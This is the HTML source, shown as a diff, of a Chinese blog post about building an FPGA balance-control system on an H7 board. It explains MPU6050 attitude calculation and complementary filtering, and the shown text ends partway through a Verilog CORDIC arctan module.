@@ -1,0 +1,1175 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>京微齐力：基于H7的平衡控制系统（一、姿态解析） - 编程爱好者博客</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		<meta property="og:title" content="京微齐力：基于H7的平衡控制系统（一、姿态解析）" />
+<meta property="og:description" content="目录 前言一、关于平衡控制系统二、实验效果三、硬件选择1、H7P20N0L176-M2H12、MPU6050 四、理论简述五、程序设计1、Cordic算法2、MPU6050采集数据3、fir&amp;iir滤波4、姿态解算 六、资源消耗&amp;工程获取七、总结 前言 很久之前，就想用纯FPGA做一套控制系统。可以用到平衡车、飞控、水陆两栖船上面，让很多想快速入门比赛的学子，能够在这套“底盘”上面，结合图像处理、多信息融合等技术，快速搭建出自己的作品。恰逢认识FPGA之旅的作者-吴工，他也在做这件事，顿感追攀更觉相逢晚，恨不相逢早。对未来的真正慷慨，是把一切都献给现在，不再想，今天就开始做！
+一、关于平衡控制系统 我们惊叹舞蹈演员在舞台上飞快地旋转，而身体却不会倾倒；我们佩服体操运动员一连翻几个筋斗，却能稳稳落地。如果我们不注意被石头绊着时，我们会“下意识”地立刻纠正身体的姿势，不让自己轻易摔倒。我们体内有一套维持身体平衡的器官系统在默默地为我们工作着。
+人既是如此，那么机器也是这样的，机器要保持机身平衡，也需要这样一个器官系统来修正机器的运动。这种器官有很多，姿态传感器就是其中一种。目前主流的姿态传感器有三轴、六轴及九轴三种。这九轴分别就是：三轴加速度计，三轴陀螺仪以经三轴磁场。
+作为本系列文章的开篇，本次实验，先选用较为中等的六轴-MPU6050作为姿态传感器，后面会慢慢根据系统来升级传感器。MPU6050由三轴加速度计和三轴陀螺仪组成，它可以测量物体在x、y、z三个方向上的加速度和角速度。加速度计可以检测物体的线性加速度，而陀螺仪可以检测物体的角速度。通过将加速度计和陀螺仪的测量结果进行组合，可以计算出物体的方向和角度。
+关于六轴传感器的坐标系分析，网上很多，本文就不做赘续，有兴趣的可以自己查一查。
+二、实验效果 1、FPGA采集MPU6050的数据，并进行滤波；
+2、FPGA以串口的方式，将姿态数据发送到上位机。
+基于H7的控制平衡系统（一）
+从视频可以看到，当MPU6050姿态发生变化时，上位机波形跟传感器变化一致。yaw需要做角速度求解，这里只做了相对开始位置的，即初始值，所以只有在开始可以看到一点，后面的波形看不到。（具体原因请看第四节：理论简述）
+三、硬件选择 1、H7P20N0L176-M2H1 本次实验使用H7作为主控板，HME-H7系列采用低功耗22nm 技术，集成了高性能ARM Cortex-M3 MCU(频率高达300M）、外围设备与大容量片上SRAM。本次实验只使用逻辑部分，后面根据需要再扩展MCU实验。需要板子的同学，可以到米联客店铺购买。
+2、MPU6050 MPU6050采用I2C总线通信协议，可以直接连接到微控制器或单片机上。在使用MPU6050之前，需要进行校准，以保证其测量结果的准确性。校准过程可以通过软件或硬件进行。将VCC、GND、SCL、SDA连接到H7开发板即可。
+MPU6050框图
+四、理论简述 物体的姿态，通俗的讲，就是通过六轴数据求解三个角度：
+roll：绕X轴（横滚） 范围：±180° ，与旋转方向相反转是增大 – 右滚为正，左滚为负；
+pitch：绕Y轴（俯仰）范围：±90°,与旋转方向相反转是增大-- 抬头为正，低头为负；
+yaw：绕z轴（偏航） 范围：±180° ，与旋转方向相反转是增大 --右偏为正，左偏为负。
+当我们得到MPU6050的原始数据时，接下来如果我们要真正用上这些数据，通常我们都会利用数学方法把它们转换成角度。
+1、加速度求解角度的表达式
+注：通过加速度是无法求解yaw的，因为重力加速度的Z轴，在相对地平面东西南北旋转时并无变化，因此只能靠Z轴的角速度来惯性累计估算旋转角度。
+roll = atan(acc_y / acc_x); pitch = atan(acc_x / (sqrt(acc_y*acc_y &#43; acc_z * acc_z))); 2、通过角速度求解：
+通过角速度的求解就更简单了，只需要将当前角度加上(角速度×dt)就可以。角速度求解的时候会有些问题，在静态的时候，角速度会有零漂，这个时候角度误差会越来越大。
+可以看到有上面的两种方法求解角度，可以单独使用，但是可能会不太准确，精度要求不高的场合可以只使用加速度求解。在精度要求比较高的场合下，需要使用这两种方法求解，然后再将求得的结果进行融合。常用的方法有: 卡尔曼滤波、清华角度滤波、一阶互补滤波、四元数解算。
+这几种方法中，从难度上来看，一阶互补滤波和清华角度滤波是比较容易理解的，而且它们的本质其实是相同的，都是利用了权重互补，它们调试起来比较简单，而卡尔曼滤波和四元数解算的方法比较难理解。当然利用DMP直接输出角度也是可以的，不过移植起来也不太容易。从滤波效果上来看，本人的理解是：DMP直接输出角度&gt;卡尔曼滤波&gt;=四元数解算&gt;清华角度滤波&gt;=一阶互补滤波。 不过其实一阶互补滤波只要把调试得比较好，得到的角度还是够用的。
+一阶互补滤波：
+roll = a * acc_roll &#43; (1 - a) *gyro_roll; 五、程序设计 1、Cordic算法 求解：" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://bchobby.github.io/posts/345164ba961126fb48c4d3c35c028f00/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-12-14T19:23:49+08:00" />
+<meta property="article:modified_time" content="2023-12-14T19:23:49+08:00" />
+
+
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="编程爱好者博客" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">编程爱好者博客</div>
+					
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">京微齐力：基于H7的平衡控制系统（一、姿态解析）</h1>
+			
+		</header>
+		<div class="content post__content clearfix">
+			
+<div id="content_views" class="markdown_views prism-tomorrow-night">
+                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
+                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
+                    </svg>
+                    <p></p> 
+<div class="toc"> 
+ <h4>目录</h4> 
+ <ul><li><a href="#_1" rel="nofollow">前言</a></li><li><a href="#_4" rel="nofollow">一、关于平衡控制系统</a></li><li><a href="#_14" rel="nofollow">二、实验效果</a></li><li><a href="#_24" rel="nofollow">三、硬件选择</a></li><li><ul><li><a href="#1H7P20N0L176M2H1_25" rel="nofollow">1、H7P20N0L176-M2H1</a></li><li><a href="#2MPU6050_28" rel="nofollow">2、MPU6050</a></li></ul> 
+  </li><li><a href="#_34" rel="nofollow">四、理论简述</a></li><li><a href="#_60" rel="nofollow">五、程序设计</a></li><li><ul><li><a href="#1Cordic_62" rel="nofollow">1、Cordic算法</a></li><li><a href="#2MPU6050_264" rel="nofollow">2、MPU6050采集数据</a></li><li><a href="#3firiir_416" rel="nofollow">3、fir&amp;iir滤波</a></li><li><a href="#4_794" rel="nofollow">4、姿态解算</a></li></ul> 
+  </li><li><a href="#_1099" rel="nofollow">六、资源消耗&amp;工程获取</a></li><li><a href="#_1108" rel="nofollow">七、总结</a></li></ul> 
+</div> 
+<p></p> 
+<h2><a id="_1"></a>前言</h2> 
+<p>      很久之前，就想用纯FPGA做一套控制系统。可以用到平衡车、飞控、水陆两栖船上面，让很多想快速入门比赛的学子，能够在这套“底盘”上面，结合图像处理、多信息融合等技术，快速搭建出自己的作品。恰逢认识FPGA之旅的作者-吴工，他也在做这件事，顿感追攀更觉相逢晚，恨不相逢早。对未来的真正慷慨，是把一切都献给现在，不再想，今天就开始做！</p> 
+<h2><a id="_4"></a>一、关于平衡控制系统</h2> 
+<p>      我们惊叹舞蹈演员在舞台上飞快地旋转，而身体却不会倾倒；我们佩服体操运动员一连翻几个筋斗，却能稳稳落地。如果我们不注意被石头绊着时，我们会“下意识”地立刻纠正身体的姿势，不让自己轻易摔倒。我们体内有一套维持身体平衡的器官系统在默默地为我们工作着。<br> <img src="https://images2.imgbox.com/48/09/cC5NjPGH_o.png" alt="在这里插入图片描述"></p> 
+<p>      人既是如此，那么机器也是这样的，机器要保持机身平衡，也需要这样一个器官系统来修正机器的运动。这种器官有很多，姿态传感器就是其中一种。目前主流的姿态传感器有三轴、六轴及九轴三种。这九轴分别就是：三轴加速度计，三轴陀螺仪以经三轴磁场。<br>       作为本系列文章的开篇，本次实验，先选用较为中等的六轴-MPU6050作为姿态传感器，后面会慢慢根据系统来升级传感器。MPU6050由三轴加速度计和三轴陀螺仪组成，它可以测量物体在x、y、z三个方向上的加速度和角速度。加速度计可以检测物体的线性加速度，而陀螺仪可以检测物体的角速度。通过将加速度计和陀螺仪的测量结果进行组合，可以计算出物体的方向和角度。</p> 
+<p>      关于六轴传感器的坐标系分析，网上很多，本文就不做赘续，有兴趣的可以自己查一查。</p> 
+<h2><a id="_14"></a>二、实验效果</h2> 
+<p>1、FPGA采集MPU6050的数据，并进行滤波；<br> 2、FPGA以串口的方式，将姿态数据发送到上位机。</p> 
+<p></p> 
+<div class="csdn-video-box"> 
+ <iframe id="u09Vba0x-1702482954473" frameborder="0" src="https://live.csdn.net/v/embed/351366" allowfullscreen="true" data-mediaembed="csdn"></iframe> 
+ <p>基于H7的控制平衡系统（一）</p> 
+</div> 
+<p></p> 
+<p>      从视频可以看到，当MPU6050姿态发生变化时，上位机波形跟传感器变化一致。yaw需要做角速度求解，这里只做了相对开始位置的，即初始值，所以只有在开始可以看到一点，后面的波形看不到。（具体原因请看第四节：理论简述）<br> <img src="https://images2.imgbox.com/b9/43/dDvgsRJZ_o.png" alt="在这里插入图片描述"></p> 
+<h2><a id="_24"></a>三、硬件选择</h2> 
+<h3><a id="1H7P20N0L176M2H1_25"></a>1、H7P20N0L176-M2H1</h3> 
+<p>      本次实验使用H7作为主控板，HME-H7系列采用低功耗22nm 技术，集成了高性能ARM Cortex-M3 MCU(频率高达300M）、外围设备与大容量片上SRAM。本次实验只使用逻辑部分，后面根据需要再扩展MCU实验。需要板子的同学，可以到米联客店铺购买。<br> <img src="https://images2.imgbox.com/b0/fb/1VBKthDI_o.png" alt="在这里插入图片描述"></p> 
+<h3><a id="2MPU6050_28"></a>2、MPU6050</h3> 
+<p>      MPU6050采用I2C总线通信协议，可以直接连接到微控制器或单片机上。在使用MPU6050之前，需要进行校准，以保证其测量结果的准确性。校准过程可以通过软件或硬件进行。将VCC、GND、SCL、SDA连接到H7开发板即可。<br> <img src="https://images2.imgbox.com/9a/2f/UYtWoLAJ_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/01/75/S7AmvjUh_o.png" alt="在这里插入图片描述"><br>                                                                         MPU6050框图</p> 
+<h2><a id="_34"></a>四、理论简述</h2> 
+<p>      物体的姿态，通俗的讲，就是通过六轴数据求解三个角度：<br> roll：绕X轴（横滚） 范围：±180° ，与旋转方向相反转是增大 – 右滚为正，左滚为负；<br> pitch：绕Y轴（俯仰）范围：±90°,与旋转方向相反转是增大-- 抬头为正，低头为负；<br> yaw：绕z轴（偏航） 范围：±180° ，与旋转方向相反转是增大 --右偏为正，左偏为负。<br> <img src="https://images2.imgbox.com/06/3b/PGUxo7Xv_o.png" alt="在这里插入图片描述"><br>       当我们得到MPU6050的原始数据时，接下来如果我们要真正用上这些数据，通常我们都会利用数学方法把它们转换成角度。<br>       <mark>1、加速度求解角度的表达式</mark><br> 注：通过加速度是无法求解yaw的，因为重力加速度的Z轴，在相对地平面东西南北旋转时并无变化，因此只能靠Z轴的角速度来惯性累计估算旋转角度。</p> 
+<pre><code class="prism language-c">
+roll <span class="token operator">=</span> <span class="token function">atan</span><span class="token punctuation">(</span>acc_y <span class="token operator">/</span> acc_x<span class="token punctuation">)</span><span class="token punctuation">;</span>
+pitch <span class="token operator">=</span> <span class="token function">atan</span><span class="token punctuation">(</span>acc_x <span class="token operator">/</span> <span class="token punctuation">(</span><span class="token function">sqrt</span><span class="token punctuation">(</span>acc_y<span class="token operator">*</span>acc_y <span class="token operator">+</span> acc_z <span class="token operator">*</span> acc_z<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre> 
+<p>      <mark>2、通过角速度求解：</mark><br>       通过角速度的求解就更简单了，只需要将当前角度加上(角速度×dt)就可以。角速度求解的时候会有些问题，在静态的时候，角速度会有零漂，这个时候角度误差会越来越大。<br>       可以看到有上面的两种方法求解角度，可以单独使用，但是可能会不太准确，精度要求不高的场合可以只使用加速度求解。在精度要求比较高的场合下，需要使用这两种方法求解，然后再将求得的结果进行融合。<font color="Orange">常用的方法有: 卡尔曼滤波、清华角度滤波、一阶互补滤波、四元数解算。</font></p> 
+<p>      这几种方法中，从难度上来看，<mark>一阶互补滤波和清华角度滤波是比较容易理解的</mark>，而且它们的本质其实是相同的，都是利用了权重互补，它们调试起来比较简单，而卡尔曼滤波和四元数解算的方法比较难理解。当然利用DMP直接输出角度也是可以的，不过移植起来也不太容易。从滤波效果上来看，本人的理解是：<mark>DMP直接输出角度&gt;卡尔曼滤波&gt;=四元数解算&gt;清华角度滤波&gt;=一阶互补滤波。</mark> 不过其实一阶互补滤波只要把调试得比较好，得到的角度还是够用的。</p> 
+<p>一阶互补滤波：</p> 
+<pre><code class="prism language-c">roll <span class="token operator">=</span> a <span class="token operator">*</span> acc_roll <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">-</span> a<span class="token punctuation">)</span> <span class="token operator">*</span>gyro_roll<span class="token punctuation">;</span>
+</code></pre> 
+<h2><a id="_60"></a>五、程序设计</h2> 
+<h3><a id="1Cordic_62"></a>1、Cordic算法</h3> 
+<p>求解：</p> 
+<pre><code class="prism language-c">
+roll <span class="token operator">=</span> <span class="token function">atan</span><span class="token punctuation">(</span>acc_y <span class="token operator">/</span> acc_x<span class="token punctuation">)</span><span class="token punctuation">;</span>
+pitch <span class="token operator">=</span> <span class="token function">atan</span><span class="token punctuation">(</span>acc_x <span class="token operator">/</span> <span class="token punctuation">(</span><span class="token function">sqrt</span><span class="token punctuation">(</span>acc_y<span class="token operator">*</span>acc_y <span class="token operator">+</span> acc_z <span class="token operator">*</span> acc_z<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre> 
+<p>      单片机或者FPGA等计算能力弱的嵌入式设备进行加减运算还是容易实现，但是想要计算三角函数（sin、cos、tan），甚至双曲线、指数、对数这样复杂的函数，那就需要费些力了。通常这些函数的计算需要通者查找表或近似计算（如泰勒级数逼近）等技术来转换为硬件易于实现的方式。</p> 
+<p>      Cordic(Coordinate Rotation Digital Computer, 坐标旋转数字计算方法)算法就是一种化繁为简的算法，通过基本的加减和移位运算代替乘法运算，逐渐逼近目标值，得出函数的数值解。<br> <font color="Orange">      具体实现理论可参考以下文章，这里不过多赘述：</font><br> <font color="pink">      https://blog.csdn.net/ngany/article/details/117401494（CORDIC算法详解及FPGA实现）<br>       https://zhuanlan.zhihu.com/p/471677202（FPGA的算法解析4：CORDIC 算法解析）</font></p> 
+<pre><code class="prism language-c">`timescale <span class="token number">1</span>ns <span class="token operator">/</span> <span class="token number">1</span>ps
+<span class="token comment">//**************************************** Message ***********************************//</span>
+<span class="token comment">//技术交流：bumianzhe@126.com</span>
+<span class="token comment">//关注CSDN博主：“千歌叹尽执夏”</span>
+<span class="token comment">//Author: FPGA之旅 &amp; 千歌叹尽执夏 </span>
+<span class="token comment">//All rights reserved	                               </span>
+<span class="token comment">//----------------------------------------------------------------------------------------</span>
+<span class="token comment">// Target Devices: 		H7P20N0L176-M2H1</span>
+<span class="token comment">// Tool Versions:       Fuxi 2023.1</span>
+<span class="token comment">// File name:           Cordic_arctan</span>
+<span class="token comment">// Last modified Date:  2023年8月25日16:00:00</span>
+<span class="token comment">// Last Version:        V1.1</span>
+<span class="token comment">// Descriptions:        Cordic算子</span>
+<span class="token comment">//----------------------------------------------------------------------------------------</span>
+<span class="token comment">//****************************************************************************************//</span>
+
+
+module <span class="token function">Cordic_arctan</span><span class="token punctuation">(</span>
+
+    input           clk<span class="token punctuation">,</span>
+    input           rst_n<span class="token punctuation">,</span>
+
+    input           cordic_req<span class="token punctuation">,</span>
+    output          cordic_ack<span class="token punctuation">,</span>
+
+    input <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>  X<span class="token punctuation">,</span>
+    input <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>  Y<span class="token punctuation">,</span>
+
+    output<span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>            amplitude<span class="token punctuation">,</span>  <span class="token comment">//幅度，偏大1.64倍，这里做了近似处理</span>
+    output  <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">31</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>    theta    <span class="token comment">//扩大了2^16</span>
+<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+`define rot0  <span class="token number">32</span>'d2949120       <span class="token comment">//45度*2^16</span>
+`define rot1  <span class="token number">32</span>'d1740992       <span class="token comment">//26.5651度*2^16</span>
+`define rot2  <span class="token number">32</span>'d919872        <span class="token comment">//14.0362度*2^16</span>
+`define rot3  <span class="token number">32</span>'d466944        <span class="token comment">//7.1250度*2^16</span>
+`define rot4  <span class="token number">32</span>'d234368        <span class="token comment">//3.5763度*2^16</span>
+`define rot5  <span class="token number">32</span>'d117312        <span class="token comment">//1.7899度*2^16</span>
+`define rot6  <span class="token number">32</span>'d58688         <span class="token comment">//0.8952度*2^16</span>
+`define rot7  <span class="token number">32</span>'d29312         <span class="token comment">//0.4476度*2^16</span>
+`define rot8  <span class="token number">32</span>'d14656         <span class="token comment">//0.2238度*2^16</span>
+`define rot9  <span class="token number">32</span>'d7360          <span class="token comment">//0.1119度*2^16</span>
+`define rot10 <span class="token number">32</span>'d3648          <span class="token comment">//0.0560度*2^16</span>
+`define rot11 <span class="token number">32</span>'d1856          <span class="token comment">//0.0280度*2^16</span>
+`define rot12 <span class="token number">32</span>'d896           <span class="token comment">//0.0140度*2^16</span>
+`define rot13 <span class="token number">32</span>'d448           <span class="token comment">//0.0070度*2^16</span>
+`define rot14 <span class="token number">32</span>'d256           <span class="token comment">//0.0035度*2^16</span>
+`define rot15 <span class="token number">32</span>'d128           <span class="token comment">//0.0018度*2^16</span>
+
+
+
+
+reg <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">31</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>    Xn<span class="token punctuation">[</span><span class="token number">16</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+reg <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">31</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>    Yn<span class="token punctuation">[</span><span class="token number">16</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+reg <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">31</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>    Zn<span class="token punctuation">[</span><span class="token number">16</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+reg<span class="token punctuation">[</span><span class="token number">31</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>           rot<span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+reg                 cal_delay<span class="token punctuation">[</span><span class="token number">16</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+
+assign cordic_ack <span class="token operator">=</span> cal_delay<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+assign theta      <span class="token operator">=</span> Zn<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+assign amplitude  <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>Xn<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>Xn<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span>  <span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token punctuation">(</span>Xn<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token number">16</span><span class="token punctuation">;</span>  <span class="token comment">幅度，偏大1.64倍，这里做了近似处理 ,然后缩小了2^16</span>
+
+always@<span class="token punctuation">(</span>posedge clk<span class="token punctuation">)</span>
+begin
+    rot<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> `rot0<span class="token punctuation">;</span>
+    rot<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> `rot1<span class="token punctuation">;</span>
+    rot<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> `rot2<span class="token punctuation">;</span>
+    rot<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> `rot3<span class="token punctuation">;</span>
+    rot<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> `rot4<span class="token punctuation">;</span>
+    rot<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> `rot5<span class="token punctuation">;</span>
+    rot<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> `rot6<span class="token punctuation">;</span>
+    rot<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> `rot7<span class="token punctuation">;</span>
+    rot<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> `rot8<span class="token punctuation">;</span>
+    rot<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> `rot9<span class="token punctuation">;</span>
+    rot<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> `rot10<span class="token punctuation">;</span>
+    rot<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> `rot11<span class="token punctuation">;</span>
+    rot<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> `rot12<span class="token punctuation">;</span>
+    rot<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> `rot13<span class="token punctuation">;</span>
+    rot<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> `rot14<span class="token punctuation">;</span>
+    rot<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> `rot15<span class="token punctuation">;</span>
+end
+
+always@<span class="token punctuation">(</span>posedge clk or negedge rst_n<span class="token punctuation">)</span>
+begin
+    <span class="token keyword">if</span><span class="token punctuation">(</span> rst_n <span class="token operator">==</span> <span class="token number">1</span>'b0<span class="token punctuation">)</span>
+        cal_delay<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">1</span>'b0<span class="token punctuation">;</span>
+    <span class="token keyword">else</span>
+        cal_delay<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> cordic_req<span class="token punctuation">;</span>
+end
+
+genvar j<span class="token punctuation">;</span>
+generate
+    <span class="token keyword">for</span><span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">1</span> <span class="token punctuation">;</span>j <span class="token operator">&lt;</span> <span class="token number">17</span> <span class="token punctuation">;</span> j <span class="token operator">=</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>
+    begin<span class="token operator">:</span> loop
+        always@<span class="token punctuation">(</span>posedge clk or negedge rst_n<span class="token punctuation">)</span>
+        begin
+            <span class="token keyword">if</span><span class="token punctuation">(</span> rst_n <span class="token operator">==</span> <span class="token number">1</span>'b0<span class="token punctuation">)</span>
+                cal_delay<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">1</span>'b0<span class="token punctuation">;</span>
+            <span class="token keyword">else</span>
+                cal_delay<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> cal_delay<span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        end
+    end
+endgenerate
+
+<span class="token comment">//将坐标挪到第一和四项限中</span>
+always@<span class="token punctuation">(</span>posedge clk or negedge rst_n<span class="token punctuation">)</span>
+begin
+    <span class="token keyword">if</span><span class="token punctuation">(</span> rst_n <span class="token operator">==</span> <span class="token number">1</span>'b0<span class="token punctuation">)</span>
+    begin
+        Xn<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+        Yn<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+        Zn<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+    end
+    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span> cordic_req <span class="token operator">==</span> <span class="token number">1</span>'b1<span class="token punctuation">)</span>
+    begin
+        <span class="token keyword">if</span><span class="token punctuation">(</span> X <span class="token operator">&lt;</span> $<span class="token keyword">signed</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> Y <span class="token operator">&lt;</span> $<span class="token keyword">signed</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        begin
+            Xn<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token operator">-</span><span class="token punctuation">(</span>X <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            Yn<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token operator">-</span><span class="token punctuation">(</span>Y <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        end
+        <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span> X <span class="token operator">&lt;</span> $<span class="token keyword">signed</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> Y <span class="token operator">&gt;</span> $<span class="token keyword">signed</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        begin
+            Xn<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token operator">-</span><span class="token punctuation">(</span>X <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            Yn<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token operator">-</span><span class="token punctuation">(</span>Y <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        end
+        <span class="token keyword">else</span>
+        begin
+            Xn<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> X <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span>
+            Yn<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> Y <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span>
+        end
+        Zn<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+    end
+    <span class="token keyword">else</span> 
+    begin
+        Xn<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> Xn<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
